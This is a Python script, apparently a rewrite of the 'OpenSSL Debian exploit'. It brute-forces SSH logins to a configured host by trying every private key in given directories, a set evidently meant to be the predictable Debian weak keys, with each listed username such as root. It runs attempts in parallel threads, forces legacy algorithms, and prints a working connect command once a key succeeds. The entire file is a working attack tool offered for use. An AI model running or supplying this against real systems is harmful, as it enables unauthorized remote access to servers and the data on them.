#!/usr/bin/env python3
# written by snowdroppe, happy hacking n_n

import subprocess, time, os, threading, sys, signal

# config variables - change these as appropriate
# defaults are in the comments in [ ]

config = {
    "host":  "1.2.3.4", # IP address or FQDN
    "port":  "22", # port number of SSH service ["22"]
    "users":  ["root"], # list of usernames to attempt
    "dirs":  ["./"], # list of directories of keys to attempt
                  # (only files without "." will be attempted so .pub is excluded)
    "success_code":  0, # expected process exit code for a successful attempt [0]
    "reject_str": "Connection closed by remote host", # string that indicates connection rejection
    "period": 5, # reporting period in seconds [5]
    "threads": 8, # number of threads. Keep this low to prevent rejected connections [8]
    "debug": False # prints attempt info and stder [False]
}

# code - shouldn't need to touch these (adjust cmd if you need extra SSH options)

pool = 0
die = False

class colours:
    red = "\033[31m"
    green = "\033[32m"
    bold = "\033[1m"
    clear = "\033[0m"

def attempt(config, user, key):
        global pool
        global die
        cmd = ("ssh"
        + " -oKexAlgorithms=+diffie-hellman-group1-sha1"
        + " -oHostKeyAlgorithms=+ssh-dss,ssh-rsa"
        + " -oPubkeyAcceptedKeyTypes=+ssh-dss,ssh-rsa"
        + " -oPreferredAuthentications=publickey"
        + " -T -p %s -i %s %s@%s" % (config["port"], key, user, config["host"])
        )
        p = subprocess.run(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        while (config["reject_str"] in p.stdout.decode("utf-8")):
            print("Connection rejected - try reducing thread count. Retrying %s" % key)
            p = subprocess.run(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        if config["debug"]:
            print(user+"@"+config["host"]+":"+config["port"]+" with " + key
                    + " -> code=%s\t" % p.returncode+p.stdout.decode("utf-8"), end="")
        if (p.returncode == config["success_code"] and not die):
            print("\a"*4 + "[" + colours.green + colours.bold + "SUCCESS" + colours.clear + "] valid key found: " + key)
            print("Connect with: " + colours.bold + cmd.replace("-T ", "") + colours.clear)
            die = True
        else:
            pool += 1
        
def enum_dir(dirs):
    k = []
    for i in dirs:
        j = os.listdir(i)
        k += [os.path.join(i,k) for k in j if "." not in k]
    k.sort()
    return k

def suicide(x, y):
    global die
    die = True

def cleanup():
    print("\nWaiting for children to finish... ", end="")
    while(len(threading.enumerate()) > 1):
        pass
    print("DONE")
    sys.exit(0)

def main(config):
    print("\n-OpenSSL Debian exploit- by ||WarCat team||, ported to python3,") 
    print("... and then rewritten from scratch because it was kinda shite, by snowdroppe")
    keys = enum_dir(config["dirs"])
    n = len(keys)*len(config["users"])
    print("\nFound %d key(s) and %d username(s) -> %d candidates" % (len(keys), len(config["users"]), n))
    i = 0
    l = 0
    global die
    global pool
    pool = config["threads"]
    start_time = time.time()
    cur_time = time.time()
    print("Starting attack...\n")
    for k in keys:
        for u in config["users"]:
            if (die):
                cleanup()
            while (pool == 0):
                pass
            threading.Thread(target=attempt, args=(config, u, k), daemon=False).start()
            pool -= 1
            i += 1
            l += 1
            if (time.time() > cur_time + config["period"]):
                print("Tested: %d\tRemaining: %d\tElapsed: %dm\tSpeed: %.1f/s\tETA: %dm" %(i,n-i,(time.time()-start_time)/60,l/10,(n-i)/i*(time.time()-start_time)/60))
                cur_time = time.time()
                l = 0
    while(len(threading.enumerate()) > 1):
        pass
    if (not die):
        print("\a"*4 + "[" + colours.red + colours.bold + "FAILURE" + colours.clear + "] all keys exhuasted")
    cleanup()

if (__name__=="__main__"):
    signal.signal(signal.SIGINT, suicide)
    main(config)
